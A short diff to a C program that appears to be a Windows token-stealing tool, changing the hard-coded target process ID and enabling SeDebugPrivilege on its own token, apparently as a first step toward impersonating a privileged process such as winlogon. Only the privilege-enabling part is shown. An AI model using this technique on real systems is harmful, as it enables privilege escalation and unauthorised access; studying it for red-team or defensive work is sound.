@@ -66,11 +66,11 @@ int main()
     HANDLE WinlogonHandle;
     HANDLE TokenHandle;
 
-    DWORD PID_TO_IMPERSONATE = 920;
+    DWORD PID_TO_IMPERSONATE = 11780;
 
     HANDLE currentTokenHandle = NULL;
-	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
-	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
+	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
+	if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
 	{
 		printf("[+] SeDebugPrivilege enabled!\n");
 	}
